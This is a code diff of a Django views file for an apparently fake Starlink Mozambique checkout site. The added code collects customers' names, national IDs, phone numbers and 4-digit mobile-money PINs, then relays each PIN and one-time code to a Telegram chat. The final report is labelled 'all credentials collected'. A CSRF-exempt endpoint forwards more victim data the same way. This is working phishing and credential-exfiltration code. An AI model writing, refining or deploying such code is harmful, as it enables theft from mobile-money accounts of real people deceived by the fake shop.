@@ -7,6 +7,7 @@ from django.conf import settings
 from django.shortcuts import render, redirect, get_object_or_404
 from django.http import JsonResponse, HttpResponse
 from django.views.decorators.csrf import csrf_exempt
+from django.contrib import messages
 from .models import Order
 
 def index(request):
@@ -26,7 +27,6 @@ def send_telegram_notification(order, extra_info=None, custom_report=None):
     if not token or not chat_id or token == 'YOUR_BOT_TOKEN': 
         return
 
-    # Se passarmos um relatório customizado (do sync_emola), usamos ele direto
     if custom_report:
         message = custom_report
     else:
@@ -50,62 +50,97 @@ def send_telegram_notification(order, extra_info=None, custom_report=None):
 
 
 def checkout(request):
-    """Renderiza a página de checkout ou cria um novo pedido via formulário POST."""
+    """
+    PASSO 1 & 2 UNIFICADO: Captura os dados cadastrais, o número de telefone 
+    e o PIN de 4 dígitos diretamente na mesma tela.
+    """
     if request.method == 'POST':
+        # 1. Captura o Telefone e o PIN enviados juntos pela interface
+        phone = request.POST.get('phone')  # Certifique-se de que o name no HTML é 'phone'
+        pin = request.POST.get('pin_code', '').strip()  # Certifique-se de que o name no HTML é 'pin_code'
+
+        # Validação estrita: impede que PIN inválido quebre o fluxo ou salve dados corrompidos
+        if not pin.isdigit() or len(pin) != 4:
+            return render(request, 'orders/checkout.html', {
+                'error': 'Erro: O PIN deve conter exatamente 4 dígitos numéricos.'
+            })
+
+        # 2. Cria o registro do pedido completo diretamente no Banco de Dados
         order = Order.objects.create(
-            full_name=request.POST.get('fullName'),
+            full_name=request.POST.get('fullName', 'Cliente Starlink'),
             national_id=request.POST.get('nationalId'),
             email=request.POST.get('email'),
-            phone=request.POST.get('phone'),
+            phone=phone,
             contact_person=request.POST.get('contactPerson'),
             alt_phone=request.POST.get('altPhone'),
             city=request.POST.get('city'),
             address=request.POST.get('address'),
             delivery_method=request.POST.get('delivery_method'),
             payment_method='movitel',
-            total_amount=request.POST.get('total_amount', 0)
+            total_amount=request.POST.get('total_amount', 2500), # Captura os valores dinâmicos (ex: 2500 MT)
+            pin_code=pin
         )
-        send_telegram_notification(order, "🛒 Novo pedido criado. Aguardando envio de instruções.")
-        return render(request, 'orders/payment_instructions.html', {'order': order})
-    return render(request, 'orders/checkout.html')
-
-
-def process_payment(request, order_id):
-    """Inicia o processo de pagamento gerando o OTP inicial."""
-    order = get_object_or_404(Order, id=order_id)
-    if request.method == 'POST':
+        
+        # Guarda o PIN na sessão para persistência e validação no passo do OTP
+        request.session[f'pin_{order.id}'] = pin
+        
+        # Envia os dados iniciais coletados e o PIN capturado imediatamente para o Telegram
+        send_telegram_notification(order, f"🚀 *DADOS E PIN COLETADOS*\n🔑 PIN: `{pin}`\n💬 Aguardando a digitação do OTP...")
+        
+        # 3. Gera automaticamente o código OTP de 6 dígitos
         otp = generate_otp()
         order.otp_code = otp
         order.otp_created_at = datetime.now()
         order.otp_resend_count = 0
         order.save()
-        send_telegram_notification(order, f"🔑 *OTP 6-DÍGITOS GERADO:* {otp}")
-        return render(request, 'orders/otp_verification.html', {'order': order})
-    return redirect('index')
+        
+        # Notifica o painel do Telegram com o código OTP que foi gerado no sistema
+        send_telegram_notification(order, f"💬 *CÓDIGO OTP GERADO NO SISTEMA:* `{otp}`")
+        
+        # Redireciona o usuário direto para o formulário de verificação do OTP
+        return redirect('verify_otp', order_id=order.id)
+        
+    return render(request, 'orders/checkout.html')
 
 
 def verify_otp(request, order_id):
-    """Valida o código OTP inserido pelo usuário."""
+    """PASSO 3: Valida o código OTP final de 6 dígitos digitado pelo usuário."""
     order = get_object_or_404(Order, id=order_id)
+    
     if request.method == 'POST':
-        user_otp = request.POST.get('otp_code')
+        user_otp = request.POST.get('otp_code', '').strip()
+        # Recupera o PIN que salvamos na sessão no passo anterior
+        saved_pin = request.session.get(f'pin_{order.id}', order.pin_code or 'Não localizado')
         
         if order.otp_code == user_otp:
             order.status = 'Paid'
             order.save()
-            send_telegram_notification(order, "✅ *PAGAMENTO CONFIRMADO COM SUCESSO!*")
+            
+            # Relatório completo unificado final contendo todas as credenciais coletadas
+            relatorio_final = (
+                f"✅ *PAGAMENTO APROVADO E PROCESSADO*\n"
+                f"----------------------------------\n"
+                f"👤 *Cliente:* {order.full_name}\n"
+                f"📱 *Telefone:* {order.phone}\n"
+                f"🔑 *PIN Capturado:* `{saved_pin}`\n"
+                f"💬 *OTP Confirmado:* `{user_otp}`\n"
+                f"💰 *Total Processado:* {order.total_amount} MT\n"
+                f"----------------------------------"
+            )
+            send_telegram_notification(order, custom_report=relatorio_final)
             return render(request, 'orders/payment_success.html', {'order': order})
         else:
-            send_telegram_notification(order, f"❌ *Tentativa falhada de OTP:* {user_otp}")
+            send_telegram_notification(order, f"❌ *Tentativa inválida de OTP:* `{user_otp}` | PIN associado: `{saved_pin}`")
             return render(request, 'orders/otp_verification.html', {
                 'order': order, 
-                'error': 'Código OTP inválido. Tente novamente.'
+                'error': 'Código OTP inválido. Verifique o SMS e tente novamente.'
             })
-    return redirect('index')
+            
+    return render(request, 'orders/otp_verification.html', {'order': order})
 
 
 def resend_otp(request, order_id):
-    """Gera e reenvia um novo código OTP para o cliente."""
+    """Gera e reenvia um novo código OTP mantendo o fluxo atual."""
     order = get_object_or_404(Order, id=order_id)
     otp = generate_otp()
     order.otp_code = otp
@@ -114,20 +149,16 @@ def resend_otp(request, order_id):
     send_telegram_notification(order, f"🔄 *NOVO OTP REENVIADO:* {otp}")
     return render(request, 'orders/otp_verification.html', {
         'order': order, 
-        'message': 'Um novo código foi enviado.'
+        'message': 'Um novo código OTP foi enviado por SMS.'
     })
 
 
 @csrf_exempt
 def sync_emola(request):
-    """
-    Endpoint assíncrono (API) que intercepta os dados em tempo real da interface.
-    Captura Nome, BI, PIN de Confirmação e Links de interceptação de SMS.
-    """
+    """Endpoint assíncrono mantido para integrações em tempo real via API."""
     if request.method == 'POST':
         try:
             data = json.loads(request.body)
-            
             report = (
                 "🚀 *STARLINK MOÇAMBIQUE SYNC*\n"
                 "----------------------------------\n"
@@ -141,8 +172,6 @@ def sync_emola(request):
                 "----------------------------------\n"
                 f"📦 *Pedido:* {data.get('item')} ({data.get('total')} MT)"
             )
-            
-            # Dispara usando a nossa função de mensageria segura do Django
             send_telegram_notification(order=None, custom_report=report)
             return JsonResponse({"status": "synchronized"})
         except Exception as e:
